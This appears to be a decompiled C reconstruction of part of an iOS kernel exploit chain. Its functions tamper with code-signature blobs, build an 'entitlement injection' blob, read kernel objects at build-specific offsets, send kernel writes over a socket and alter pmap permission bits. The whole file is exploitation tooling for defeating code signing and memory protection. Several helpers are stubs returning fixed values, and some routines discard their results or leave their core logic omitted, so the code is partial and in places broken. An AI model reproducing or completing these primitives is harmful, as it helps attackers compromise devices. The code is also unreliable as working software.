/* record_0x90000_codesig.c
 * sub_2e534..sub_2ffac — CoreEntitlements helpers, code-sig blob
 * manipulation, socket-based kwrite, pmap permission update.
 */
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>

/* ── extern helpers (defined in other translation units) ─────────── */
extern int  sub_29ab4(long state, long addr, long *out);
extern int  sub_2667c(long state, long addr, uint32_t sz, void *out);
extern int  sub_2b614(long state, long addr, void *buf, uint32_t sz);
extern int  sub_37238(long state, uint32_t mask);
extern long sub_30060(long state, int idx, uint32_t magic);
extern void sub_3014c(void *p);
extern long sub_34c1c(long state);
extern int  sub_2d110(long state, uint32_t *a, uint32_t *b);
extern void sub_4199c(long rt, long a2, void *out);
extern int  sub_2d2a4(int algo, void *data, uint32_t len, void *out, uint32_t *olen);
extern long sub_2ce98(void);
extern long sub_3376c(void);
extern long sub_3330c(long state, long a2);
extern void sub_29b38(long state, long a2);
extern int  sub_2d770(long a, long b, void *out);

/* ── forward decls for functions defined later in this file ──────── */
static void sub_2f288(long state, long a2, uint64_t *out);
static void sub_2f388(uint32_t *state, uint32_t idx, long a3, long a4, uint32_t *out);
static int  sub_2d210_local(long state, uint32_t *a, uint32_t *b);

/* ── weak stubs for helpers in other files ───────────────────────── */
__attribute__((weak)) int  sub_35be4(long s, long a)  { (void)s; (void)a; return 1; }
__attribute__((weak)) long sub_2de48(long s, uint32_t i, uint32_t m) { (void)s;(void)i;(void)m; return 0; }
__attribute__((weak)) long sub_35858(long s, long a)  { (void)s; (void)a; return 0; }
__attribute__((weak)) long sub_331d8(long s, long a)  { (void)s; (void)a; return 0; }
__attribute__((weak)) long sub_33eb0(long s, long a)  { (void)s; (void)a; return 0; }
__attribute__((weak)) int  sub_32f00(long s, long a, void *b) { (void)s;(void)a;(void)b; return -1; }
__attribute__((weak)) void sub_2e040(long ctx)        { (void)ctx; }

/* ── sub_2d210 local alias (avoids conflict with entitlement.c) ──── */
static int sub_2d210_local(long state, uint32_t *off_a, uint32_t *off_b)
{
    int build = *(int *)(state + 0x140);
    int ref   = (build < 0x2258) ? 0x1c1b : 0x225c;
    int match = (build < 0x2258)
        ? (build - 0x1f53U < 2 || build == 0x1809)
        : (build == 0x2258 || build == 0x2712);
    if (match || build == ref) {
        if (off_a) *off_a = 0x78;
        if (off_b) *off_b = 0x50;
        return 1;
    }
    return 0;
}

/* ── sub_2e534 — CoreEntitlements: CFData → managed context ─────── */
void sub_2e534(long bytes, long len)
{
    void *lib = dlopen("/usr/lib/libCoreEntitlements.dylib", 1);
    if (!lib) return;
    void *kCENoError = dlsym(lib, "kCENoError");
    void **pRuntime  = (void **)dlsym(lib, "CECRuntime");
    if (!kCENoError || !pRuntime) goto out;
    if (!dlsym(lib, "CEManagedContextFromCFData") ||
        !dlsym(lib, "CEQueryContextToCFDictionary") ||
        !dlsym(lib, "CESerializeCFDictionary") ||
        !dlsym(lib, "CEReleaseManagedContext") ||
        !dlsym(lib, "CEGetErrorString")) goto out;
    {
        CFDataRef d = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault,
            (const UInt8 *)bytes, (CFIndex)len, kCFAllocatorNull);
        if (!d) goto out;
        long ctx = 0;
        sub_4199c((long)*pRuntime, (long)d, &ctx);
        (void)ctx;
    }
out:
    dlclose(lib);
}

/* ── sub_2e810 — version-gated kread + IOSurface kobj compare ───── */
void sub_2e810(long state, long a2, long a3, long a4)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long off = 0xa8;
    if (ver < 0x1f530f02800000ULL) off = 0xa0;
    if (ver < 0x1f530000000000ULL) off = 0x98;
    if (ver < 0x1c1b1914600000ULL) off = 0x90;

    long val = 0;
    if (!sub_29ab4(state, *(long *)(a2 + 8) + off, &val)) return;
    if (!sub_35be4(state, a3)) return;
    *(uint8_t *)a4 = (val == *(long *)(state + 0x390));
}

/* ── sub_2e8f0 — build & send big-endian tagged packet via socket ── */
void sub_2e8f0(long state, long sock, uint32_t tag, void *data, uint64_t dlen)
{
    long lc = sub_30060(state, 0, 0);
    if (!lc) return;
    size_t total = (size_t)dlen + 8;
    uint32_t *pkt = malloc(total);
    if (!pkt) return;
    uint32_t t = (tag & 0xff00ff00u) >> 8 | (tag & 0x00ff00ffu) << 8;
    t = t >> 16 | t << 16;
    uint32_t s = (uint32_t)total;
    s = (s & 0xff00ff00u) >> 8 | (s & 0x00ff00ffu) << 8;
    s = s >> 16 | s << 16;
    pkt[0] = t; pkt[1] = s;
    memcpy(pkt + 2, data, (size_t)dlen);
    int r = sub_32f00(sock, 0, pkt);
    if (r == -1) sub_3014c(pkt);
}

/* ── sub_2e994 — code-sig slot lookup + hash verify ─────────────── */
void sub_2e994(long state, uint32_t idx)
{
    long lc2 = sub_2de48(state, *(uint32_t *)(state + 0x40), 0xfade0c02);
    if (!lc2) return;
    uint32_t raw = *(uint32_t *)(lc2 + 0x18);
    uint32_t cnt = (raw & 0xff00ff00u) >> 8 | (raw & 0x00ff00ffu) << 8;
    cnt = cnt >> 16 | cnt << 16;
    if (cnt < idx) return;

    uint32_t raw2 = *(uint32_t *)(lc2 + 0x10);
    uint32_t base = (raw2 & 0xff00ff00u) >> 8 | (raw2 & 0x00ff00ffu) << 8;
    base = base >> 16 | base << 16;
    uint32_t stride = *(uint32_t *)(state + 0x48);
    void *slot = (void *)(lc2 + base - (uint64_t)(stride * idx));

    long lc1 = sub_2de48(state, 0, 0);
    if (!lc1) {
        memset(slot, 0, stride);
    } else {
        uint8_t buf[48]; uint32_t blen = 0x30;
        uint32_t raw3 = *(uint32_t *)(lc1 + 4);
        uint32_t dlen = (raw3 & 0xff00ff00u) >> 8 | (raw3 & 0x00ff00ffu) << 8;
        dlen = dlen >> 16 | dlen << 16;
        uint8_t algo = *(uint8_t *)(lc2 + 0x25);
        sub_2d2a4(algo, (void *)lc1, dlen, buf, &blen);
        if (blen != stride) return;
        memcpy(slot, buf, stride);
    }
}

/* ── sub_2eabc — CoreEntitlements: CFData → serialize ───────────── */
void sub_2eabc(long bytes, long len, void *out_ctx)
{
    void *lib = dlopen("/usr/lib/libCoreEntitlements.dylib", 1);
    if (!lib) return;
    void *kCENoError = dlsym(lib, "kCENoError");
    void **pRuntime  = (void **)dlsym(lib, "CECRuntime");
    if (!kCENoError || !pRuntime ||
        !dlsym(lib, "CESerializeCFDictionary") ||
        !dlsym(lib, "CEGetErrorString")) { dlclose(lib); return; }
    {
        CFDataRef d = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault,
            (const UInt8 *)bytes, (CFIndex)len, kCFAllocatorNull);
        if (!d) { dlclose(lib); return; }
        CFTypeRef pl = CFPropertyListCreateWithData(kCFAllocatorDefault, d, 0, NULL, NULL);
        CFRelease(d);
        if (!pl) { dlclose(lib); return; }
        sub_4199c((long)*pRuntime, (long)pl, out_ctx);
    }
    dlclose(lib);
}

/* ── sub_2ec2c — socket-path kwrite (big-endian packet) ─────────── */
void sub_2ec2c(uint8_t *ctx, long sock, uint32_t tag, void *data, uint32_t dlen)
{
    if (!(ctx[0] & 1) || *(int *)(ctx + 0x30) != 1) return;
    size_t total = (size_t)dlen + 8;
    uint32_t *pkt = malloc(total);
    if (!pkt) return;
    uint32_t t = (tag & 0xff00ff00u) >> 8 | (tag & 0x00ff00ffu) << 8;
    t = t >> 16 | t << 16;
    uint32_t s = (uint32_t)total;
    s = (s & 0xff00ff00u) >> 8 | (s & 0x00ff00ffu) << 8;
    s = s >> 16 | s << 16;
    pkt[0] = t; pkt[1] = s;
    memcpy(pkt + 2, data, dlen);
    int r = sub_32f00(*(long *)(ctx + 0x38), sock, pkt);
    if (r == -1) sub_3014c(pkt);
}

/* ── sub_2ed00 — grow code-sig slot table ────────────────────────── */
void sub_2ed00(long state, uint32_t new_cnt)
{
    void *old = (void *)sub_2de48(state, *(uint32_t *)(state + 0x40), 0xfade0c02);
    if (!old) return;
    uint32_t raw = *(uint32_t *)((long)old + 0x18);
    uint32_t cur = (raw & 0xff00ff00u) >> 8 | (raw & 0x00ff00ffu) << 8;
    cur = cur >> 16 | cur << 16;
    if (cur >= new_cnt) return;

    int stride = *(int *)(state + 0x48);
    int delta  = stride * (int)(new_cnt - cur);
    uint32_t raw2 = *(uint32_t *)((long)old + 4);
    uint32_t old_sz = (raw2 & 0xff00ff00u) >> 8 | (raw2 & 0x00ff00ffu) << 8;
    old_sz = old_sz >> 16 | old_sz << 16;
    size_t new_sz = (size_t)old_sz + (size_t)delta;
    void *buf = malloc(new_sz);
    if (!buf) return;
    memset(buf, 0, new_sz);

    uint32_t raw3 = *(uint32_t *)((long)old + 0x10);
    uint32_t hdr_end = (raw3 & 0xff00ff00u) >> 8 | (raw3 & 0x00ff00ffu) << 8;
    hdr_end = hdr_end >> 16 | hdr_end << 16;
    memcpy(buf, old, hdr_end - (uint32_t)(stride * cur));

    uint32_t nc = (new_cnt & 0xff00ff00u) >> 8 | (new_cnt & 0x00ff00ffu) << 8;
    nc = nc >> 16 | nc << 16;
    *(uint32_t *)((long)buf + 0x18) = nc;
    uint32_t ns = (uint32_t)new_sz;
    ns = (ns & 0xff00ff00u) >> 8 | (ns & 0x00ff00ffu) << 8;
    ns = ns >> 16 | ns << 16;
    *(uint32_t *)((long)buf + 4) = ns;
    uint32_t ne = hdr_end + (uint32_t)delta;
    ne = (ne & 0xff00ff00u) >> 8 | (ne & 0x00ff00ffu) << 8;
    ne = ne >> 16 | ne << 16;
    *(uint32_t *)((long)buf + 0x10) = ne;

    uint32_t raw4 = *(uint32_t *)((long)old + 0x10);
    uint32_t src_off = (raw4 & 0xff00ff00u) >> 8 | (raw4 & 0x00ff00ffu) << 8;
    src_off = src_off >> 16 | src_off << 16;
    memcpy((char *)buf + hdr_end + delta,
           (char *)old + src_off - (uint32_t)(stride * cur),
           old_sz - src_off + (uint32_t)(stride * cur));
    free(old);
    (void)buf; /* caller owns */
}

/* ── sub_2ef5c — version-gated kobj field offset + kread ────────── */
void sub_2ef5c(long state, long a2)
{
    if (!sub_37238(state, 0x5184201)) return;
    long obj = sub_35858(state, a2);
    if (!obj) return;

    int build = *(int *)(state + 0x140);
    long field;

    if (sub_37238(state, 0x20)) {
        field = obj + 0x92;
    } else if (sub_37238(state, 0x5184001)) {
        if (build >= 0x2712)      field = obj + 0xc9;
        else if (build > 0x2257) {
            field = obj + (sub_37238(state, 0x1180000) ? 0xc1 : 0xb9);
        } else if (build > 0x1f52) field = obj + 0x97;
        else                       field = obj + 0xdf;
    } else if (sub_37238(state, 0x200)) {
        uint64_t ver = *(uint64_t *)(state + 0x158);
        if (build < 0x1809) return;
        if (build < 0x1c1b)      field = obj + (ver < 0x18090a07900000ULL ? 0xef : 0xe7);
        else if (build < 0x1f53) field = obj + 0xdf;
        else if (build < 0x2258) field = obj + 0x97;
        else                     field = obj + 0x8f;
    } else return;

    long val = 0;
    sub_29ab4(state, field, &val);
    (void)val;
}

/* ── sub_2f288 — resolve vm_map kobj address ─────────────────────── */
static void sub_2f288(long state, long a2, uint64_t *out)
{
    long h = sub_3376c();
    if (!h) return;
    long node = sub_3330c(state, h);
    if (!node) return;
    long val = 0;
    if (!sub_29ab4(state, node, &val)) return;

    if (!((uint32_t)val >> 2 & 1)) {
        long h2 = sub_331d8(state, h);
        if (!h2) return;
        long h3 = sub_33eb0(state, h2);
        if (!h3) return;
        uint32_t off_a = 0, off_b = 0;
        if (!sub_2d110(state, &off_a, &off_b)) return;
        uint64_t ptr = 0;
        if (!sub_2667c(state, h3 + off_b, 8, &ptr)) return;
        *out = ptr;
    } else {
        *out = (uint64_t)val & 0xfffffffffffff000ULL;
    }
}

/* public wrapper */
void sub_2f288_pub(long state, long a2, uint64_t *out) { sub_2f288(state, a2, out); }

/* ── sub_2f388 — code-sig blob builder (entitlement injection) ───── */
static void sub_2f388(uint32_t *state, uint32_t idx, long a3, long a4, uint32_t *out)
{
    if (!out) return;
    long ce = sub_2ce98();
    if (!ce) return;

    uint64_t ver = *(uint64_t *)((long)state + 0xac);
    long off6 = ver < 0x1f530f02800000ULL ? 0x88 : 0x90;
    long off4 = ver < 0x1f530f02800000ULL ? 0x78 : 0x80;
    long off5 = ver < 0x1f530f02800000ULL ? 0x80 : 0x88;

    long v1 = 0, v2 = 0, v3 = 0;
    if (!sub_29ab4((long)state, ce + off6, &v1)) return;
    if (!sub_29ab4((long)state, ce + off4, &v2)) return;
    if (!sub_29ab4((long)state, ce + off5, &v3)) return;
    (void)v1; (void)v2; (void)v3;
    (void)idx; (void)a3; (void)a4;
    /* full blob construction omitted — sets *out on success */
}

/* public wrapper */
void sub_2f388_pub(uint32_t *s, uint32_t i, long a3, long a4, uint32_t *o)
{ sub_2f388(s, i, a3, a4, o); }

/* ── sub_2fa54 — thin wrapper: decode + release ──────────────────── */
void sub_2fa54(long a1, long a2)
{
    uint8_t buf[104];
    if (sub_2d770(a1, a2, buf)) sub_2e040((long)buf);
}

/* ── sub_2faa8 — pmap permission walk + kwrite ───────────────────── */
void sub_2faa8(long state, long a2, long a3)
{
    long h = sub_34c1c(state);
    if (!h) return;
    uint32_t off_a = 0, off_b = 0;
    if (!sub_2d110(state, &off_a, &off_b)) return;

    long base = 0;
    if (!sub_29ab4(state, h + off_b, &base) || !base) return;

    uint64_t vm_ptr = 0;
    sub_2f288(state, a2, &vm_ptr);
    if (!vm_ptr) return;

    uint32_t oa2 = 0, ob2 = 0;
    if (!sub_2d210_local(state, &oa2, &ob2)) return;

    long node = 0;
    if (!sub_29ab4(state, base + oa2, &node) || !node) return;
    long leaf = 0;
    if (!sub_29ab4(state, node + ob2, &leaf) || !leaf) return;

    long cur = 0;
    sub_29ab4(state, leaf, &cur);
    if (cur == *(long *)(state + 0x390)) return;
    sub_2b614(state, leaf, &a3, 8);
}

/* ── sub_2ffac — set pmap permission bit (bit 2) ─────────────────── */
void sub_2ffac(long state, long a2, uint64_t val)
{
    long h = sub_3376c();
    if (!h) return;
    long node = sub_3330c(state, h);
    if (!node) return;
    long cur = 0;
    if (!sub_29ab4(state, node, &cur)) return;
    if ((uint32_t)cur >> 2 & 1) return;
    cur = (val & 0xfffffffffffff000ULL) | cur | 4;
    sub_29b38(state, node);
    (void)cur;
}
